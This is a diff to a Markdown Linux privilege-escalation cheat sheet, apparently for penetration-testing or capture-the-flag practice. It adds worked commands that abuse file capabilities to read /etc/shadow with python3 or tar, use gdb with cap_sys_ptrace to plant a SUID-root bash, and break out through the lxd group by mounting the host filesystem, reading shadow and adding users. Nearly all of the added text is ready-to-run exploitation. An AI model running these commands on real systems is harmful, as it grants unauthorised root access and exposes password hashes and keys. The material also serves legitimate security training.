@@ -24,7 +24,20 @@ getcap /usr/bin/python3.9
 # If python3 has cap_setuid+ep
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
-Other common abusable caps: `cap_dac_read_search` (read any file, e.g. `tar` trick), `cap_sys_admin` (mount abuse / container breakout), `cap_sys_ptrace` (inject into root processes with `gdb`/python-ptrace).
+Other common abusable caps — worked commands (use whichever binary `getcap -r /` shows holds the cap):
+```bash
+# cap_dac_read_search+ep = READ any file regardless of permissions (no write). If python3/tar/etc.
+# holds it, read /etc/shadow to crack offline, or read root's SSH key:
+/usr/bin/python3 -c 'print(open("/etc/shadow").read())'        # python3 holds the cap
+# tar holds it: archive the protected file (cap lets tar read it), then extract and read:
+tar --xattrs -cf /tmp/s.tar /etc/shadow && tar -xf /tmp/s.tar -C /tmp && cat /tmp/etc/shadow
+
+# cap_sys_ptrace+ep = attach to a root process and run code in it. Drop a SUID-root bash via gdb:
+gdb -p "$(pgrep -u root -n .)" -batch \
+  -ex 'call (void)system("cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb")'
+/tmp/rb -p                                                      # -p keeps euid=0 -> instant root
+```
+`cap_sys_admin` (mount / overlayfs container breakout) is situational — see its GTFOBins page.
 
 **Reference:** https://gtfobins.github.io/ (filter by "Capabilities" on each binary page)
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
@@ -163,14 +176,23 @@ id            # look for 'lxd' or 'lxc' in groups
 
 **Exploitation:**
 ```bash
-# On attacker box: build minimal alpine image (or use pre-built distrobuilder image)
+# 1. Get a small image onto the target. If `lxc image list` is empty, build Alpine on your attacker
+#    box and transfer the tarball(s) over (see file-transfer-matrix.md):
+#    (attacker) git clone https://github.com/saghul/lxd-alpine-builder
+#               cd lxd-alpine-builder && sudo ./build-alpine      # -> alpine-v3.x-x86_64-*.tar.gz
+#    (target)   import whatever you transferred:
+lxc image import ./alpine-*.tar.gz --alias alpine
+#    Newer LXD, if the target can reach the image server instead of an offline build:
+#        lxc image copy images:alpine/edge local: --alias alpine
+lxc image list                           # confirm 'alpine' is present before continuing
+
+# 2. Launch a PRIVILEGED container with the host root bind-mounted, then act as root over the host FS:
 lxc init alpine mycontainer -c security.privileged=true
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
-# inside container:
-cd /mnt/root
-chroot . /bin/sh
+# inside the container you are root on /mnt/root (the host filesystem):
+cd /mnt/root && cat etc/shadow           # or: chroot . /bin/sh; read the root flag; add a user
 ```
 
 **Reference:** https://gtfobins.github.io/gtfobins/docker/
